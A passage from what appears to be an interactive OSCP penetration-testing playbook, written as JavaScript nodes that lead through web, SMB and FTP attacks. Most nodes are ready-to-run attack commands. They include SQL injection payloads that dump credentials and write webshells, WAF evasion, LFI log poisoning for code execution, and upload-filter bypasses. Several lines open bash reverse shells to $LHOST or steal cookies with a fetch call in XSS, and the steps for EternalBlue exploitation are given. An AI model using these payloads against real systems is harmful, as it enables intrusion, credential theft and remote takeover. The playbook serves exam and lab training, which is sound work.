      { label: "Nothing — keep fuzzing main host", next: "web_fuzz_deep" },
    ],
  },

  web_fuzz_deep: {
    phase: "WEB",
    title: "Deep Web Fuzzing",
    body: "Go wider and deeper. Parameter brute force, LFI testing, XSS, command injection wordlists. Use wfuzz for fine-grained control.",
    cmd: `# Parameter brute force
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt \\
  --hc 404 "http://$IP/page?FUZZ=test"

# LFI wordlist
wfuzz -c -z file,/opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt \\
  --hc 404 "http://$IP/page?file=FUZZ"

# XSS fuzz
wfuzz -c -z file,/usr/share/wordlists/Fuzzing/XSS.txt \\
  "http://$IP/page?param=FUZZ"

# Command injection fuzz (POST)
wfuzz -c -z file,/usr/share/wordlists/Fuzzing/command-injection.txt \\
  -d "field=FUZZ" "http://$IP/page"

# HTML escape fuzz
wfuzz -c -z file,/usr/share/wordlists/Fuzzing/yeah.txt \\
  "http://$IP/page?param=FUZZ"`,
    warn: null,
    choices: [
      { label: "Found LFI", next: "lfi" },
      { label: "Found command injection", next: "cmd_injection" },
      { label: "Found XSS", next: "xss" },
      { label: "Found parameter — test for SQLi", next: "sqli_test" },
      { label: "Template injection ({{7*7}} returns 49)", next: "ssti" },
      { label: "URL/redirect parameter — SSRF", next: "ssrf" },
      { label: "XML input / SOAP endpoint / file upload", next: "xxe" },
      { label: "Numeric ID in URL or API — IDOR test", next: "idor" },
      { label: "Still nothing — searchsploit service versions", next: "searchsploit_web" },
    ],
  },

  param_found: {
    phase: "WEB",
    title: "Parameter Found",
    body: "URL parameter detected. Test for SQLi, LFI, and command injection manually first before reaching for tools — understand what the app is doing.",
    cmd: `# Quick manual tests
curl "http://$IP/page?id=1'"          # SQLi probe
curl "http://$IP/page?file=../../../etc/passwd"  # LFI probe
curl "http://$IP/page?cmd=;id"        # CMDi probe

# Check response differences carefully`,
    warn: null,
    choices: [
      { label: "SQLi looks promising", next: "sqli_test" },
      { label: "LFI response detected", next: "lfi" },
      { label: "Command injection response", next: "cmd_injection" },
      { label: "URL/redirect param — SSRF", next: "ssrf" },
      { label: "Template syntax reflected — SSTI", next: "ssti" },
    ],
  },

  wordpress: {
    phase: "WEB",
    title: "WordPress",
    body: "Run WPScan hard. Vulnerable plugins are the most reliable attack vector. Enumerate users, all plugins, all themes.",
    cmd: `# Full aggressive scan (free API token available at wpscan.com)
wpscan --url http://$IP \\
  --enumerate u,ap,at \\
  --plugins-detection aggressive \\
  --api-token <TOKEN>

# Brute force once you have usernames
wpscan --url http://$IP -U admin,editor \\
  -P /usr/share/wordlists/rockyou.txt \\
  --password-attack xmlrpc-multicall`,
    warn: null,
    choices: [
      { label: "Got admin creds — shell via theme editor", next: "wp_shell" },
      { label: "Found vulnerable plugin — searchsploit it", next: "searchsploit_web" },
      { label: "No creds yet — keep enumerating", next: "web_fuzz_deep" },
    ],
  },

  wp_shell: {
    phase: "WEB",
    title: "WordPress → Shell",
    body: "Two paths: theme editor (Appearance → Theme Editor → 404.php) or malicious plugin zip. Both drop a webshell.",
    cmd: `# Option 1: Theme Editor
# Appearance > Theme Editor > select 404.php
# Add: <?php system($_GET['cmd']); ?>
# Access: http://$IP/wp-content/themes/<theme>/404.php?cmd=id

# Option 2: Malicious Plugin
# Create plugin zip with PHP shell inside
# Upload via Plugins > Add New > Upload

# Once confirmed RCE — reverse shell
curl "http://$IP/wp-content/themes/theme/404.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'"`,
    warn: null,
    choices: [
      { label: "RCE confirmed — catch shell", next: "reverse_shell" },
    ],
  },

  login_page: {
    phase: "WEB",
    title: "Login Page",
    body: "Test default creds first (5 minutes). Then SQLi bypass. Then brute force. Username enumeration via response differences is gold.",
    cmd: `# Default creds to try first
admin:admin  admin:password  admin:admin123
root:root    guest:guest     test:test

# SQLi bypass
' OR 1=1--
admin'--
' OR '1'='1'--

# Username enumeration — look for different response length/time
wfuzz -c -z file,/opt/SecLists/Fuzzing/USERNAMES/usernames.txt \\
  --hc 404,403 "http://$IP/users/FUZZ"

# Brute force with hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt \\
  http-post-form "/login:user=^USER^&pass=^PASS^:Invalid" -V`,
    warn: null,
    choices: [
      { label: "Got access", next: "file_upload" },
      { label: "SQLi bypass worked", next: "sqli_test" },
      { label: "Need usernames first", next: "web_fuzz_deep" },
    ],
  },

  sqli_test: {
    phase: "WEB",
    title: "SQL Injection — Detection",
    body: "Manual detection first. Understand what the injection IS before you automate. PortSwigger: the injection type determines the entire attack chain — error-based, UNION, blind boolean, blind time each need a different approach.",
    cmd: `# ── STEP 1: DETECT ──────────────────────
# Inject quote — look for error or behavioral change
'
''
# Numeric context
1 AND 1=1
1 AND 1=2    # different response = boolean blind

# ── STEP 2: IDENTIFY TYPE ────────────────
# Error-based:    DB error visible in response body
# UNION-based:    predictable column structure returned
# Boolean blind:  same status code, different content length
# Time-based:     no visible difference — use delays

# ── STEP 3: COLUMN COUNT (for UNION) ────
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   # error at N = N-1 columns
# Or increment NULLs:
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

# ── STEP 4: FIND STRING COLUMN ───────────
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--

# ── SQLMAP QUICK START ───────────────────
sqlmap -u "http://$IP/page?id=1" --batch --level=2 --risk=2
sqlmap -u "http://$IP/login" --data="user=a&pass=b" --batch`,
    warn: "Read the RESPONSE not just the status code. Content length change with same 200 = boolean blind. Delay = time-based blind. Error text = error-based. These are different attack paths requiring different techniques.",
    choices: [
      { label: "Error visible in response — error-based", next: "sqli_error" },
      { label: "Column count found — UNION injection", next: "sqli_union" },
      { label: "Behavior changes but no output — blind boolean", next: "sqli_blind" },
      { label: "No difference at all — time-based blind", next: "sqli_time" },
      { label: "WAF blocking payloads", next: "sqli_waf" },
      { label: "sqlmap confirmed — escalate", next: "sqli_sqlmap" },
    ],
  },

  sqli_error: {
    phase: "WEB",
    title: "SQLi — Error-Based Extraction",
    body: "Error messages leak data directly into the response. Fastest extraction method when available. PortSwigger: use extractvalue() or updatexml() for MySQL, cast() for PostgreSQL, convert() for MSSQL.",
    cmd: `# ── MYSQL: extractvalue ──────────────────
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
' AND extractvalue(1,concat(0x7e,(SELECT user())))--
' AND extractvalue(1,concat(0x7e,(SELECT database())))--

# Enumerate tables
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--

# Enumerate columns
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users')))--

# Dump credentials (page results with LIMIT)
' AND extractvalue(1,concat(0x7e,(SELECT concat(username,0x3a,password) FROM users LIMIT 0,1)))--
' AND extractvalue(1,concat(0x7e,(SELECT concat(username,0x3a,password) FROM users LIMIT 1,1)))--

# ── MYSQL: updatexml alternative ─────────
' AND updatexml(1,concat(0x7e,(SELECT version())),1)--

# ── MSSQL: convert ───────────────────────
' AND 1=convert(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND 1=convert(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'))--

# ── POSTGRESQL: cast ─────────────────────
' AND 1=cast((SELECT version()) as int)--
' AND 1=cast((SELECT usename FROM pg_user LIMIT 1) as int)--`,
    warn: "extractvalue truncates at 32 chars. Use substring() to extract longer values: extractvalue(1,concat(0x7e,substring((SELECT password FROM users LIMIT 0,1),1,30)))",
    choices: [
      { label: "Got credentials", next: "creds_found" },
      { label: "DB structure mapped — escalate to FILE", next: "sqli_shell" },
      { label: "MSSQL — xp_cmdshell path", next: "mssql" },
      { label: "Output truncating — switch to UNION", next: "sqli_union" },
    ],
  },

  sqli_union: {
    phase: "WEB",
    title: "SQLi — UNION-Based Extraction",
    body: "Append your SELECT to the original query. PortSwigger: requires matching column count and compatible types. Most reliable extraction when columns are visible in response. Suppress original rows with AND 1=0.",
    cmd: `# Prerequisites: column count known, string column found
# Assume 3 columns, column 2 is string:

# ── DATABASE FINGERPRINT ─────────────────
' UNION SELECT NULL,version(),NULL--
' UNION SELECT NULL,database(),NULL--
' UNION SELECT NULL,user(),NULL--

# ── ENUMERATE STRUCTURE ──────────────────
# All databases
' UNION SELECT NULL,group_concat(schema_name),NULL FROM information_schema.schemata--

# Tables in current DB
' UNION SELECT NULL,group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--

# Columns in users table
' UNION SELECT NULL,group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='users'--

# ── DUMP CREDENTIALS ─────────────────────
' UNION SELECT NULL,group_concat(username,0x3a,password SEPARATOR 0x0a),NULL FROM users--

# If original query returns rows (swallows yours):
' AND 1=0 UNION SELECT NULL,group_concat(username,0x3a,password),NULL FROM users--

# ── FILE READ ────────────────────────────
' UNION SELECT NULL,load_file('/etc/passwd'),NULL--
' UNION SELECT NULL,load_file('/var/www/html/config.php'),NULL--
' UNION SELECT NULL,load_file('/etc/apache2/sites-enabled/000-default.conf'),NULL--

# ── MSSQL UNION ──────────────────────────
' UNION SELECT NULL,@@version,NULL--
' UNION SELECT NULL,name,NULL FROM master..sysdatabases--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--`,
    warn: "If UNION returns nothing but no error: the original query returns multiple rows, drowning yours. Add AND 1=0 to kill the original results. If still nothing: column types don't match — try casting: cast(version() as varchar).",
    choices: [
      { label: "Dumped credentials", next: "creds_found" },
      { label: "FILE read working — hunting configs", next: "sqli_shell" },
      { label: "MSSQL — escalate to xp_cmdshell", next: "mssql" },
      { label: "Write webshell via INTO OUTFILE", next: "sqli_shell" },
    ],
  },

  sqli_blind: {
    phase: "WEB",
    title: "SQLi — Blind Boolean Extraction",
    body: "No data in response — only true/false behavior difference. PortSwigger: infer data one character at a time. Confirm the technique manually with 2-3 payloads then hand off to sqlmap.",
    cmd: `# ── CONFIRM BOOLEAN BLIND ────────────────
# True — normal response
' AND 1=1--
# False — different response (shorter, empty, redirect)
' AND 1=2--
# Must see a consistent behavioral difference

# ── MANUAL CONFIRMATION (2-3 tests) ─────
# DB version starts with '8'?
' AND substring(version(),1,1)='8'--
# Current user is 'root'?
' AND (SELECT user())='root'--
# Table 'users' exists?
' AND (SELECT count(*) FROM users)>0--

# ── HAND OFF TO SQLMAP ───────────────────
# Boolean-only technique flag:
sqlmap -u "http://$IP/page?id=1" --technique=B --batch --level=3 --current-db

sqlmap -u "http://$IP/page?id=1" --technique=B --batch \
  -D [dbname] -T users -C username,password --dump

# POST data blind
sqlmap -u "http://$IP/login" --data="user=a&pass=b" \
  --technique=B --batch --level=3 --dbs

# ── BURP INTRUDER (manual extraction) ────
# Payload template:
# ' AND substring((SELECT password FROM users LIMIT 0,1),§POS§,1)='§CHAR§'--
# Cluster bomb: POS = 1..32, CHAR = a-z,0-9,special
# True = different response Content-Length`,
    warn: "Boolean blind is very slow manually — 8 requests per character at minimum. Confirm with 2-3 payloads then sqlmap with --technique=B. Add --threads=5 to speed extraction.",
    choices: [
      { label: "sqlmap extracting — got credentials", next: "creds_found" },
      { label: "Behavior too inconsistent — try time-based", next: "sqli_time" },
      { label: "WAF interfering", next: "sqli_waf" },
    ],
  },

  sqli_time: {
    phase: "WEB",
    title: "SQLi — Time-Based Blind",
    body: "Last resort — no visible response difference at all. PortSwigger: infer data from deliberate delays. Network latency makes this unreliable. Confirm then use sqlmap.",
    cmd: `# ── CONFIRM TIME-BASED ───────────────────
# MySQL SLEEP — expect 5 second delay
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--

# MSSQL WAITFOR
'; WAITFOR DELAY '0:0:5'--

# PostgreSQL pg_sleep
'; SELECT pg_sleep(5)--

# ── CONDITIONAL EXTRACTION ───────────────
# Confirm technique before sqlmap
' AND IF(substring(version(),1,1)='8',SLEEP(3),0)--
' AND IF((SELECT user())='root',SLEEP(3),0)--

# ── SQLMAP TIME-BASED ────────────────────
sqlmap -u "http://$IP/page?id=1" \
  --technique=T --time-sec=5 --batch --level=3 \
  --current-db

sqlmap -u "http://$IP/page?id=1" \
  --technique=T --time-sec=5 --batch \
  -D [dbname] -T users -C username,password --dump

# ── OUT-OF-BAND FALLBACK ─────────────────
# MySQL DNS exfil (requires outbound DNS)
' AND load_file(concat(0x5c5c5c5c,(SELECT version()),0x2e,0x61747461636b65722e636f6d,0x5c5c,0x7368617265))--
# Use interactsh or Burp Collaborator to catch callback`,
    warn: "Server load makes time-based unreliable — a busy server looks the same as a SLEEP(5). Increase --time-sec=8 on slow networks. If delays are wildly inconsistent, the technique won't work reliably.",
    choices: [
      { label: "sqlmap confirmed — extracting", next: "sqli_sqlmap" },
      { label: "Got credentials", next: "creds_found" },
      { label: "Unstable — look for other vectors", next: "web_fuzz_deep" },
    ],
  },

  sqli_waf: {
    phase: "WEB",
    title: "SQLi — WAF Evasion",
    body: "WAF pattern-matching keywords and characters. PortSwigger: evasion uses encoding, comment injection, case variation, and whitespace alternatives to break patterns without breaking SQL syntax.",
    cmd: `# ── DETECT WAF ───────────────────────────
wafw00f http://$IP
# 403/406/501 on SQL payloads = WAF active

# ── ENCODING BYPASSES ────────────────────
# URL encode critical chars
%27 = '     %20 = space     %2D%2D = --
# Double encode
%2527 = %27 = '

# Hex string encoding (MySQL)
0x61646d696e = 'admin'
' UNION SELECT NULL,0x61646d696e,NULL--

# ── COMMENT INJECTION ────────────────────
# Break keywords with inline comments
UN/**/ION SEL/**/ECT NULL,version(),NULL--
' UN/**/ION SEL/**/ECT NULL,version(),NULL--

# MySQL version comments
/*!UNION*/ /*!SELECT*/ NULL,version(),NULL--
/*!50000 union*/ /*!50000 select*/ NULL,version(),NULL--

# ── CASE + SPACE VARIATION ───────────────
uNiOn SeLeCt
UnIoN aLl SeLeCt

# Space substitutes: /**/ %09(tab) %0a(newline) %0d +
'%09UNION%09SELECT%09NULL,version(),NULL--

# ── SQLMAP TAMPER SCRIPTS ────────────────
sqlmap -u "http://$IP/page?id=1" \
  --tamper=space2comment,between,randomcase,charencode \
  --random-agent --delay=1 --batch --level=3

# Common tampers:
# space2comment  — spaces → /**/
# between        — > → BETWEEN x AND y
# randomcase     — random keyword casing
# charencode     — URL encode payload
# unmagicquotes  — bypass magic quote escaping
# base64encode   — base64 the payload

# Aggressive evasion stack:
sqlmap -u "http://$IP/page?id=1" \
  --tamper=space2comment,charencode,between,randomcase \
  --random-agent --delay=2 --retries=3 \
  --batch --level=5 --risk=3`,
    warn: "Aggressive scanning gets you rate-limited or blocked entirely. Add --delay=2 to sqlmap. Slow + encoded > fast + obvious against a WAF.",
    choices: [
      { label: "Bypass worked — UNION extraction", next: "sqli_union" },
      { label: "Bypass worked — sqlmap running", next: "sqli_sqlmap" },
      { label: "WAF too aggressive — different param", next: "sqli_blind" },
    ],
  },

  sqli_sqlmap: {
    phase: "WEB",
    title: "SQLi — sqlmap Full Escalation",
    body: "sqlmap is allowed on OSCP. Use it confidently but understand each flag. The escalation ladder: confirm → enumerate → dump → OS shell → file write.",
    cmd: `# ── STAGE 1: CONFIRM + FINGERPRINT ──────
sqlmap -u "http://$IP/page?id=1" --batch --dbs

# ── STAGE 2: DUMP CREDENTIALS ────────────
sqlmap -u "http://$IP/page?id=1" --batch -D [dbname] --tables
sqlmap -u "http://$IP/page?id=1" --batch -D [dbname] -T users --columns
sqlmap -u "http://$IP/page?id=1" --batch -D [dbname] -T users \
  -C username,password --dump

# ── POST / REQUEST FILE ──────────────────
# Capture in Burp → save to req.txt
sqlmap -r req.txt --batch --level=3 --risk=2 --dbs

# ── COOKIE INJECTION ─────────────────────
sqlmap -u "http://$IP/page" \
  --cookie="id=1*" --batch --level=3

# ── AUTHENTICATED SESSION ─────────────────
sqlmap -u "http://$IP/page?id=1" \
  --headers="Authorization: Bearer TOKEN" --batch

# ── OS SHELL ─────────────────────────────
# Requires: MySQL FILE priv OR MSSQL sa/xp_cmdshell
sqlmap -u "http://$IP/page?id=1" --os-shell

# ── FILE READ ────────────────────────────
sqlmap -u "http://$IP/page?id=1" --file-read="/etc/passwd"
sqlmap -u "http://$IP/page?id=1" --file-read="/var/www/html/config.php"

# ── FILE WRITE (webshell) ─────────────────
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
sqlmap -u "http://$IP/page?id=1" \
  --file-write="/tmp/shell.php" \
  --file-dest="/var/www/html/shell.php"

# ── MSSQL STACKED QUERIES → SHELL ────────
sqlmap -u "http://$IP/page?id=1" \
  --technique=S --os-shell`,
    warn: "--os-shell can fail silently. If it opens but commands don't execute: wrong webroot path. Use --file-read to probe config files and confirm the correct path first.",
    choices: [
      { label: "Dumped credentials", next: "creds_found" },
      { label: "os-shell working — upgrade to reverse shell", next: "sqli_shell" },
      { label: "File write succeeded — webshell live", next: "sqli_shell" },
      { label: "MSSQL — xp_cmdshell", next: "mssql" },
    ],
  },

  sqli_shell: {
    phase: "WEB",
    title: "SQLi → Shell",
    body: "DB access to OS shell. INTO OUTFILE for MySQL (needs FILE priv + webroot path). xp_cmdshell for MSSQL. COPY TO for PostgreSQL. Know the webroot — file write to wrong path is silent failure.",
    cmd: `# ── MYSQL: INTO OUTFILE ──────────────────
# Requires FILE privilege + writable webroot

# 1. Confirm FILE privilege
' UNION SELECT NULL,file_priv,NULL FROM mysql.user WHERE user=user()--

# 2. Find webroot
' UNION SELECT NULL,load_file('/etc/apache2/sites-enabled/000-default.conf'),NULL--
' UNION SELECT NULL,load_file('/etc/nginx/sites-enabled/default'),NULL--
' UNION SELECT NULL,load_file('/var/www/html/index.php'),NULL--

# 3. Write webshell
' UNION SELECT NULL,"<?php system($_GET['cmd']); ?>",NULL INTO OUTFILE '/var/www/html/shell.php'--

# 4. Verify + execute
curl "http://$IP/shell.php?cmd=id"
curl "http://$IP/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'"

# ── MSSQL: xp_cmdshell ───────────────────
# Enable if disabled (requires sa or sysadmin)
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--

# Execute
'; EXEC xp_cmdshell 'whoami';--
'; EXEC xp_cmdshell 'powershell -nop -w hidden -enc [BASE64]';--

# ── POSTGRESQL: COPY TO ───────────────────
'; COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/var/www/html/shell.php';--

# ── SQLMAP SHORTCUT ──────────────────────
sqlmap -u "http://$IP/page?id=1" --os-shell
# If webroot known:
sqlmap -u "http://$IP/page?id=1" \
  --file-write="/tmp/shell.php" --file-dest="/var/www/html/shell.php"`,
    warn: "INTO OUTFILE fails silently if: (1) FILE privilege missing, (2) file already exists — SQL won't overwrite, (3) path is wrong. Confirm FILE priv first. If file exists, delete it via another vector or use sqlmap --file-write which does overwrite.",
    choices: [
      { label: "Webshell live — catch reverse shell", next: "reverse_shell" },
      { label: "xp_cmdshell working — catch shell", next: "reverse_shell" },
      { label: "No FILE priv — dump creds instead", next: "sqli_sqlmap" },
      { label: "Got creds from dump", next: "creds_found" },
    ],
  },

  file_upload: {
    phase: "WEB",
    title: "File Upload",
    body: "Test every bypass method systematically. MIME type, extension, magic bytes. Double extensions still work on misconfigured servers.",
    cmd: `# Try in order:
# 1. Plain .php upload
# 2. Change Content-Type to image/jpeg
# 3. Double extension: shell.php.jpg
# 4. Alternate PHP: .php3 .php4 .phtml .phar
# 5. Null byte (older PHP): shell.php%00.jpg

# GIF magic bytes bypass — saves as .gif but executes PHP
GIF89a
<?php system($_POST["cmd"]); ?>
# Upload as shell.gif

# If Burp intercept: swap filename after upload accepted
# Or swap Content-Type mid-request`,
    warn: null,
    choices: [
      { label: "Upload worked — got webshell", next: "reverse_shell" },
      { label: "Blocked — combine with LFI to execute", next: "lfi" },
    ],
  },

  lfi: {
    phase: "WEB",
    title: "Local File Inclusion → RCE",
    body: "LFI alone gets file reads. Escalate to RCE via log poisoning, PHP wrappers, or /proc/self/environ. Windows paths are completely different — know both. Use wordlists to find files fast.",
    cmd: `# ── DETECTION ────────────────────────────
http://$IP/page?file=../../../../etc/passwd
http://$IP/page?file=../../../etc/passwd
http://$IP/page?file=/etc/passwd

# ── FILTER BYPASSES ──────────────────────
# Null byte (PHP < 5.3.4)
http://$IP/page?file=../../../../etc/passwd%00
# Double encode
http://$IP/page?file=..%252f..%252f..%252fetc%252fpasswd
# Path truncation (old PHP)
http://$IP/page?file=../../../../etc/passwd/././././././././././././././././.

# ── LINUX HIGH-VALUE FILES ────────────────
/etc/passwd
/etc/shadow
/etc/hosts
/etc/crontab
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log
/home/[user]/.ssh/id_rsa
/home/[user]/.bash_history
/var/www/html/config.php
/var/www/html/.env
/var/www/html/wp-config.php

# ── WINDOWS HIGH-VALUE FILES ──────────────
# win.ini = LFI canary on Windows — confirms it works
C:/Windows/win.ini
C:/Windows/System32/drivers/etc/hosts
C:/inetpub/wwwroot/web.config              # IIS — often has DB creds
C:/Windows/System32/inetsrv/config/applicationHost.config  # app pool creds
C:/xampp/apache/conf/httpd.conf
C:/xampp/FileZillaFTP/FileZilla Server.xml  # FTP creds
C:/ProgramData/MySQL/MySQL Server 5.5/my.ini
C:/Users/Administrator/Desktop/proof.txt
C:/Windows/repair/SAM

# Windows path traversal variations (try all)
..\\..\\..\\Windows\\win.ini
....//....//....//Windows/win.ini
%5c..%5c..%5cWindows%5cwin.ini

# ── FFUF LFI WORDLIST FUZZING ─────────────
# Linux
ffuf -u "http://$IP/page?file=FUZZ" \
  -w /opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
  -fw 0 -t 50

# Windows — dedicated Windows path list
ffuf -u "http://$IP/page?file=FUZZ" \
  -w /opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt \
  -fw 0 -t 50 -mc 200

# Combined both OS (thorough)
ffuf -u "http://$IP/page?file=FUZZ" \
  -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -fw 0 -t 50

# Add traversal prefix if basic path blocked
ffuf -u "http://$IP/page?file=../../../FUZZ" \
  -w /opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt \
  -fw 0

# ── PHP WRAPPERS ──────────────────────────
# Source code read (base64 encode)
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=../config.php
# Decode: echo "BASE64OUTPUT" | base64 -d

# RCE via data wrapper (needs allow_url_include=On)
data://text/plain,<?php system('id')?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+

# ── LOG POISONING → RCE ──────────────────
# Step 1: Inject PHP into access log via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://$IP/
# Or via SSH login attempt (hits auth.log):
ssh '<?php system($_GET["cmd"]); ?>'@$IP

# Step 2: Include log with command parameter
http://$IP/page?file=/var/log/apache2/access.log&cmd=id
http://$IP/page?file=/var/log/auth.log&cmd=id`,
    warn: "Windows LFI: always try win.ini first as your canary. If it reads, LFI is confirmed on Windows. web.config and applicationHost.config frequently contain plaintext credentials — highest value reads on a Windows/IIS target.",
    choices: [
      { label: "Log poisoning RCE — get shell", next: "reverse_shell" },
      { label: "PHP wrapper RCE working", next: "reverse_shell" },
      { label: "Found SSH key", next: "ssh_key" },
      { label: "Found creds in config / web.config", next: "creds_found" },
      { label: "Need custom wordlist for deeper fuzzing", next: "custom_wordlist" },
    ],
  },

  cmd_injection: {
    phase: "WEB",
    title: "Command Injection",
    body: "Confirmed OS command execution. Test operators manually, then use commix for automation and WAF bypass.",
    cmd: `# Manual operators — try each
; whoami
| id
|| id
& id
&& id
\`id\`
$(id)

# Out-of-band detection (if blind)
; ping -c1 $LHOST
; curl http://$LHOST/

# commix — automated, WAF-aware
commix --url="http://$IP/page?param=" \\
  --level=3 --force-ssl --skip-waf --random-agent

# wfuzz wordlist sweep
wfuzz -c -z file,/usr/share/wordlists/Fuzzing/command-injection.txt \\
  -d "field=FUZZ" "http://$IP/page"`,
    warn: null,
    choices: [
      { label: "Confirmed RCE — get reverse shell", next: "reverse_shell" },
    ],
  },

  xss: {
    phase: "WEB",
    title: "XSS",
    body: "XSS alone rarely wins. Cookie theft → session hijack → admin access is the path. Stored XSS is far more valuable than reflected.",
    cmd: `# Cookie theft
<script>
  fetch('http://$LHOST/?c='+btoa(document.cookie))
</script>

# Listen for cookies
nc -nlvp 80

# BeEF for advanced exploitation (if available)
# Hook: <script src="http://$LHOST:3000/hook.js"></script>

# CSP bypass check
curl -sv http://$IP | grep -i "content-security-policy"`,
    warn: null,
    choices: [
      { label: "Stole admin cookie — hijacked session", next: "file_upload" },
      { label: "No interesting cookies — pivot to other vectors", next: "web_fuzz_deep" },
    ],
  },

  searchsploit_web: {
    phase: "WEB",
    title: "Searchsploit / CVE Hunt",
    body: "Check every service version you found. ExploitDB, GitHub, Google. Read the exploit before running it — most need minor modification.",
    cmd: `searchsploit <service> <version>
searchsploit -m <id>   # copy to CWD
searchsploit -x <id>   # read before using
searchsploit --www <service>  # open in browser

# Also check:
# https://github.com/search?q=CVE-XXXX-YYYY
# https://packetstormsecurity.com
# Google: "<service> <version> exploit site:github.com"

# Most Python exploits just need:
python3 exploit.py $IP $LHOST $LPORT`,
    warn: "Read every exploit before running it. Modify LHOST/LPORT, fix paths, test it.",
    choices: [
      { label: "Found working exploit — got shell", next: "shell_upgrade" },
      { label: "Service looks like custom app — try BOF", next: "bof" },
      { label: "Can deliver files to user — client-side", next: "client_side" },
      { label: "No exploit — back to brute force / creds", next: "bruteforce" },
    ],
  },

  // ══════════════════════════════════════════
  //  SMB
  // ══════════════════════════════════════════
  smb_enum: {
    phase: "SMB",
    title: "SMB Enumeration",
    body: "SMB is information-rich. Null session, guest access, share contents, user enumeration. EternalBlue check is mandatory.",
    cmd: `# Full enum
enum4linux-ng -A $IP | tee scans/smb_enum.txt

# CME — null + guest
crackmapexec smb $IP -u '' -p '' --shares
crackmapexec smb $IP -u 'guest' -p '' --shares
crackmapexec smb $IP -u '' -p '' --users

# List + browse shares
smbclient -L //$IP -N
smbclient //$IP/share -N

# Vuln check
nmap --script smb-vuln* -p 445 $IP
nmap --script smb-vuln-ms17-010 -p 445 $IP`,
    warn: null,
    choices: [
      { label: "MS17-010 / EternalBlue vulnerable", next: "eternalblue" },
      { label: "Readable shares — download everything", next: "smb_loot" },
      { label: "Got usernames — brute force", next: "bruteforce" },
      { label: "Need creds to go further", next: "bruteforce" },
    ],
  },

  eternalblue: {
    phase: "SMB",
    title: "EternalBlue (MS17-010)",
    body: "Manual exploitation only — no Metasploit. AutoBlue is clean and reliable. Read the script before running.",
    cmd: `# AutoBlue-MS17-010 (manual, no MSF)
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
cd AutoBlue-MS17-010
pip install -r requirements.txt

# Generate shellcode
chmod +x shellcode/shell_prep.sh
./shellcode/shell_prep.sh
# Enter LHOST + LPORT when prompted

# Start listener
nc -nlvp $LPORT

# Fire exploit
python3 eternalblue_exploit7.py $IP shellcode/sc_x64.bin

# If x64 fails, try x86
python3 eternalblue_exploit7.py $IP shellcode/sc_x86.bin`,
    warn: "AutoBlue can crash the target if it's unstable. Revert the machine if it goes unresponsive.",
    choices: [
      { label: "Got SYSTEM shell!", next: "windows_post_exploit" },
      { label: "Exploit unstable — try manual MS17-010 PoC", next: "searchsploit_web" },
    ],
  },

  smb_loot: {
    phase: "SMB",
    title: "SMB Loot",
    body: "Recursively download everything. Grep for credentials, keys, configs. Don't read files one by one — bulk download and grep.",
    cmd: `# Recursive download
smbclient //$IP/share -N \\
  -c 'recurse ON; prompt OFF; mget *'

# Mount the share
sudo mount -t cifs //$IP/share /mnt/share \\
  -o username=,password=,vers=2.0

# Bulk grep for creds
grep -rih "password\\|passwd\\|secret\\|api_key\\|token\\|credential" /mnt/share/
find /mnt/share -name "*.xml" -o -name "*.config" \\
  -o -name "*.ini" -o -name "*.txt" \\
  -o -name "*.ps1" -o -name "*.bat" \\
  | xargs grep -il "pass" 2>/dev/null`,
    warn: null,
    choices: [
      { label: "Found credentials", next: "creds_found" },
      { label: "Found scripts/code — review them", next: "code_review" },
      { label: "Found SSH key", next: "ssh_key" },
    ],
  },

  code_review: {
    phase: "SMB",
    title: "Code / Script Review",
    body: "Scripts and executables on shares are often goldmines. Hardcoded creds, command execution, scheduled task payloads.",
    cmd: `# Grep for hardcoded creds
grep -rih "password\\|passwd\\|secret\\|key\\|token" . 2>/dev/null

# Grep for execution / injection
grep -rih "exec\\|system\\|popen\\|eval\\|invoke" . 2>/dev/null

# Strings on binaries
strings binary_file | grep -i "pass\\|user\\|http\\|key"

# Decompile .NET assemblies
ilspycmd binary.dll > output.cs
dnspy binary.exe   # GUI`,
    warn: null,
    choices: [
      { label: "Found hardcoded credentials", next: "creds_found" },
      { label: "Found command execution vector", next: "cmd_injection" },
    ],
  },

  // ══════════════════════════════════════════
  //  FTP
  // ══════════════════════════════════════════
  ftp_enum: {
    phase: "FTP",
    title: "FTP Enumeration",
    body: "Anonymous login is more common than people expect. If writable AND web-accessible, you can drop a shell directly.",
    cmd: `# Anonymous login test
ftp $IP
# Try: anonymous / anonymous
#      anonymous / (blank)

# Nmap scripts
nmap --script ftp-anon,ftp-bounce,ftp-syst -p 21 $IP

# If login works — download everything
ftp> binary
ftp> mget *
ftp> passive

# If FTP dir is under webroot — upload shell
ftp> put shell.php`,
    warn: null,
    choices: [
